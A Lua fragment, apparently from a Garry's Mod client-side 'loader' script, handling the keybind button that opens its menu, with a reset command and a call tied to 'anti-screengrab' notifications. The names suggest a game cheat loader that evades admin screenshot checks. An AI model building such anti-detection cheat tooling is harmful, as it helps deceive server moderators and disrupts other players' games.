keybindmenu.DoClick = function(self)
            keybindmenu.Paint = function( this, w, h )
				createpainbttonset(
					"Нажмите клавишу..",
					getcolormixer(3, 190),
					getcolormixer(3, 255),
					getcolormixer(4, 255),
					getcolormixer(4, 200),
					255,
					50,
					w,
					h,
					this)
				
            end
			
			
	input.StartKeyTrapping()
	self.Trapping = true
end



local function changebindkeysoloader(numberkey)


            keybindmenu.Paint = function( this, w, h )
				createpainbttonset(
					"Menu BindKey: "..input.GetKeyName( numberkey ),
					getcolormixer(3, 190),
					getcolormixer(3, 255),
					getcolormixer(4, 255),
					getcolormixer(4, 200),
					255,
					50,
					w,
					h,
					this
				)
            end
			
            keybindmenu.PaintOver = function( this, w, h )
                if not IsValid(this) then return end
                rpui.DrawStencilBorder( this, 0, 0, w, h, 0.09, getcolormixer(2, 128), getcolormixer(2, 128), this.GetAlpha(this) / 255 );
            end
end





function keybindmenu:OnChange( num )
local nums = num

if num == 57 then
--keybindmenu:SetText("NONE")
keybindsettingloader = 120
changebindkeysoloader(120)
--file.Write( "lop2/config/me/bindmenu.txt", 120 )
RunConsoleCommand("loader_menubindnumber", 120)
else
	--LocalPlayer():ChatPrint("New bound key: "..input.GetKeyName( nums ))
	keybindsettingloader = nums
	changebindkeysoloader(nums)
	--file.Write( "lop2/config/me/bindmenu.txt", nums )
	RunConsoleCommand("loader_menubindnumber", nums)
end
end

concommand.Add("loader_resetbindmenu", function()
keybindsettingloader = 72
--file.Write( "lop2/config/me/bindmenu.txt", 72 )
RunConsoleCommand("loader_menubindnumber", 72)
keybindmenu:SetValue( 72 )
changebindkeysoloader(72)
rp.Notify(NOTIFY_BLUE, 'Кнопка открытия лоадера установлена на "Insert"')
if antisgpnstatusirmg then
offnotisg() -- антисг уведомления
end
end)





